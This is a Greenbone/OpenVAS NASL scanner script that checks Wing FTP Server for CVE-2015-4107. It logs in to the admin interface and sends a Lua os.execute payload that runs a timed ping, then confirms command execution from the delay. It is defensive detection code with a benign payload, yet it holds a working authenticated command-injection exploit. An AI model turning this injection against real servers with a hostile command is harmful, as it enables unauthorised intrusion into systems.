# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804766");
  script_version("2023-07-26T05:05:09+0000");
  script_tag(name:"cvss_base", value:"8.2");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:P");
  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-09-12 11:42:19 +0530 (Fri, 12 Sep 2014)");
  script_cve_id("CVE-2015-4107");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("Wing FTP Server Authenticated Command Execution Vulnerability");

  script_tag(name:"summary", value:"Wing FTP Server is prone to authenticated remote code execution vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP
  GET request and check whether it is able to execute the code remotely.");

  script_tag(name:"insight", value:"Flaw is due to the os.execute() function
  in the embedded LUA interpreter in the admin web interface is not properly
  handling specially crafted HTTP POST requests.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  authenticated remote attacker to execute arbitrary commands.");

  script_tag(name:"affected", value:"Wing FTP Server version 4.3.8, Prior
  versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34517");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/128045");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 5466);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");
include("ftp_func.inc");

http_port = http_get_port(default:5466);

kb_creds = ftp_get_kb_creds();
FTPuser = kb_creds["login"];
FTPpass = kb_creds["pass"];

host = http_host_name(port:http_port);

foreach dir (make_list_unique("/", "/wing", "/ftp", "/wingftp", "/ftpserver", http_cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir, "/admin_login.html"),  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if(">Wing FTP Server Administrator<" >< rcvRes)
  {
    ## Login Url
    url = dir + "/admin_loginok.html";

    postData =  "username=" + FTPuser + "&password=" + FTPpass +
                "&username_val=" + FTPuser + "&password_val=" +
                FTPpass + "&submit_btn=%2bLogin%2b";

    sndReq = string("POST ", url, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(postData), "\r\n\r\n",
                    "\r\n", postData, "\r\n");

    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

    cookie = eregmatch(pattern:"Set-Cookie: UIDADMIN=([0-9a-z]*);", string:rcvRes);
    if(!cookie[1]){
      exit(0);
    }

    url = dir + '/admin_lua_script.html';

    if(os_host_runs("Windows") == "yes"){
      ping = "ping -n ";
      wait_extra_sec = 5;
    } else {
      ping = "ping -c ";
      wait_extra_sec = 7;
    }

    ## Added three times, to make sure its working properly
    sleep = make_list(3, 5, 7);

    ## Use sleep time to check we are able to execute command
    foreach sec (sleep)
    {
      postData = "command=os.execute('cmd /c " + ping + sec + " 127.0.0.1')";

      sndReq = string("POST ", url, " HTTP/1.1\r\n",
                      "Host: ", host, "\r\n",
                      "Cookie: UIDADMIN=", cookie[1], "\r\n",
                      "Content-Type: application/x-www-form-urlencoded\r\n",
                      "Content-Length: ", strlen(postData), "\r\n",
                      "\r\n", postData, "\r\n");


      ## Now check how much time it's taking to execute
      start = unixtime();
      rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
      stop = unixtime();

      time_taken = stop - start;

      ## Time taken is always 1 less than the sec
      ## So i am adding 1 to it
      time_taken = time_taken + 1;

      if(time_taken + 1 < sec || time_taken > (sec + wait_extra_sec)) exit(0);
    }
    security_message(port:http_port);
    exit(0);
  }
}

exit(99);
